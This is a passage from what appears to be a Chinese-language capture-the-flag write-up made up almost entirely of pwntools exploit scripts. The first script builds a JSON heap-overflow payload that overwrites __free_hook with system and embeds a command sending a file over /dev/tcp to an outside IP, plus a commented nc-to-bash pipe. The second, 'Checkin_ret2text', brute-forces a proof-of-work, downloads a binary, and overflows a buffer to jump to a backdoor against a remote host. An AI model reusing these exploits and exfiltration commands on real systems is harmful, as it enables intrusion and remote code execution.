        global payload
        payload += '"{}":"{}",'.format(name, value)
    def package(content):
        if len(content) & 1:
            print('eeee')
        ans = ''
        for i in range(len(content)/2):
            ans += '\\u' + content[i*2:i*2+2].encode('hex')
        return ans
    libc_addr = 0x7fd19f744000
    loadlibc()
    libc.address = libc_addr
    # print(hex(libc.sym['__free_hook']))
    shell = 'bash -c \'/This_is_your_gift > /dev/tcp/ip/7777\''
    # shell = 'nc ip 7777|/bin/bash|nc ip 9999'
    global payload
    payload = ''
    # for i in range(10):
    #     add('a'*0x18 + str(i), 'a'*0x20)
    add('a'*0x18 + 'a1', 'a'*0x20)
    add('a'*0x18 + 'a2', 'a'*0x20)
    add('a'*0x18 + 'a3', 'a'*0x20)
    add('a'*0x18 + 'a4', 'a'*0x20)
    add('a5', shell)
    add('a'*0x18 + 'a1', 'b'*0x10)
    add('a'*0x18 + 'a3', 'b'*0x10)
    add('a'*0x20 + '\\"' + 'a'*0x6 + package(p64(0x31)) + package(p64(libc.sym['__free_hook'])), 'a'*0x20)
    add(package(p64(libc.sym['system'])), 'a'*0x10)
    add('a5', 'aa')
    payload = '{' + payload + '}'
    print(payload)
    with open('payload', 'w') as f:
        f.write(payload)
payload：
    {"aaaaaaaaaaaaaaaaaaaaaaaaa1":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","aaaaaaaaaaaaaaaaaaaaaaaaa2":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","aaaaaaaaaaaaaaaaaaaaaaaaa3":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","aaaaaaaaaaaaaaaaaaaaaaaaa4":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","a5":"bash -c '/This_is_your_gift > /dev/tcp/49.232.202.102/7777'","aaaaaaaaaaaaaaaaaaaaaaaaa1":"bbbbbbbbbbbbbbbb","aaaaaaaaaaaaaaaaaaaaaaaaa3":"bbbbbbbbbbbbbbbb","aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"aaaaaa\u3100\u0000\u0000\u0000\u705e\u909f\ud17f\u0000":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","\u50ce\u789f\ud17f\u0000":"aaaaaaaaaaaaaaaa","a5":"aa",}
## Checkin_ret2text
自动化写不出，半自动跑，先下载文件，然后151行pause前手动分析完对应参数
exp：
    #!python
    #coding:utf-8
    from pwn import *
    import subprocess, sys, os
    from time import sleep
    from hashlib import sha256
    import base64
    sa = lambda x, y: p.sendafter(x, y)
    sla = lambda x, y: p.sendlineafter(x, y)
    elf_path = './x2.elf'
    ip = '123.60.82.85'
    port = 1447
    remote_libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
    LIBC_VERSION = ''
    HAS_LD = False
    HAS_DEBUG = False
    context(os='linux', arch='amd64')
    context.log_level = 'debug'
    def run(local = 1):
        LD_LIBRARY_PATH = './lib/'
        LD = LD_LIBRARY_PATH+'ld.so.6'
        global elf
        global p
        if local == 1:
            elf = ELF(elf_path, checksec = False)
            if LIBC_VERSION:
                if HAS_LD:
                    p = process([LD, elf_path], env={"LD_LIBRARY_PATH": LD_LIBRARY_PATH})
                else:
                    p = process(elf_path, env={"LD_LIBRARY_PATH": LD_LIBRARY_PATH})
            else:
                p = process(elf_path)
        else:
            p = remote(ip, port)
    def debug(cmdstr=''):
        if HAS_DEBUG and LIBC_VERSION:
            DEBUG_PATH = '/opt/patchelf/libc-'+LIBC_VERSION+'/x64/usr/lib/debug/lib/x86_64-linux-gnu/'
            cmd='source /opt/patchelf/loadsym.py\n'
            cmd+='loadsym '+DEBUG_PATH+'libc-'+LIBC_VERSION+'.so\n'
            cmdstr=cmd+cmdstr
        gdb.attach(p, cmdstr)
        pause()
    def loadlibc(filename = remote_libc_path):
        global libc
        libc = ELF(filename, checksec = False)
    def one_gadget(filename = remote_libc_path):
        return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))
    def str2int(s, info = '', offset = 0):
        if type(s) == int:
            s = p.recv(s)
        ret = u64(s.ljust(8, '\x00')) - offset
        success('%s ==> 0x%x'%(info, ret))
        return ret
    def chose(idx):
        sla('Chose', str(idx))
    def add(idx, size, content = '\n'):
        chose(1)
        sla('Index', str(idx))
        sla('Size', str(size))
        sa('Content', content)
    def edit(idx, content):
        chose(2)
        sla('Index', str(idx))
        sa('Content', content)
    def free(idx):
        chose(3)
        sla('Index', str(idx))
    def show(idx):
        chose(4)
        sla('Index', str(idx))
    def hash_digit(af, hash_hex):
        print(af, hash_hex)
        ch = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        for i in ch:
            for j in ch:
                for k in ch:
                    for h in ch:
                        if sha256(i + j + k + h + af).hexdigest() == hash_hex:
                            return i + j + k + h
    def get_file(filename):
        p.recvuntil('sha256(xxxx + ')
        hash = p.recvuntil(')')[:-1]
        p.recvuntil('== ')
        hash_hex = p.recvuntil('\n')[:-2]
        ans = hash_digit(hash, hash_hex)
        print(ans)
        sla('give me xxxx:\n', ans)
        base64_e = p.recvuntil('==end==\n')[:-8]
        with open(filename, 'wb') as f:
            global elf
            elf = base64.b64decode(base64_e)
            f.write(elf)
    def analysis(begin_addr):
        begin_addr += 0x18
        ranks = []
        def u32(content):
            return int(content[::-1].encode('hex'), 16)
        def insert(vec):
            for i, v in enumerate(ranks):
                if vec[0] < v[0]:
                    ranks.insert(i, vec)
                    return
            ranks.append(vec)
        def get_a_string(addr):
            ans = ''
            while elf[addr] != '\0':
                ans += elf[addr]
                addr += 1
            return ans
        addr = begin_addr
        n = ord(elf[addr+1])
        addr += 13
        for i in range(n):
            rk = u32(elf[addr+3: addr+7])
            va = u32(elf[addr+9])
            if va == 0x88:
                if elf[addr+7: addr+9] == '\xf7\xd0':
                    va = 0xff
                    addr -= 1
            if va == 0x2b:
                if elf[addr+7: addr+9] == '\x88\x85':
                    va = 0
                    addr -= 3
            # print(hex(rk))
            addr += 0x10
            insert((rk, va))
        # for i in ranks:
        #     print(hex(i[0]), hex(i[1]))
        print(hex(addr))
        addr += 0xa
        string_addr = addr + u32(elf[addr: addr+4]) + 4
        # print(hex(string_addr))
        string = get_a_string(string_addr)
        # print(string)
        ans = ''
        for i, v in enumerate(ranks):
            ans += chr(ord(string[i])^v[1])
        return ans
    run(0)
    get_file('x2.elf')
    pause()
    import datas
    data = datas.data.split('\n')[-2::-1]
    for i, v in enumerate(data):
        tmp = v.split(' ')
        if len(tmp) == 1 or len(tmp) == 2:
            if tmp[0] == 'EOF':
                data[i] = 'a' * int(tmp[1], 16)
            else:
                data[i] = analysis(int(tmp[0], 16))
        else:
            data[i] = ['0'] * int(tmp[0])
            data[i][int(tmp[1])] = tmp[2]
    print(data)
    for i in data:
        if type(i) == str:
            sa(':', i)
        else:
            p.recvuntil(':')
            for j in i:
                p.send(j+' ')
    backdoor = p64(0x401354) * 10
    payload = 'a'*datas.offset + backdoor
    p.sendline(payload)
    sleep(0.1)
    p.sendline('cat flag')
    p.interactive()
分析结果填入datas.py
    data = '''8 0 31292
    dde6
    DA3E
    8 0 0
    C926
    6 0 0
    EOF 24
    '''
    offset = 0x0
然后跑就出了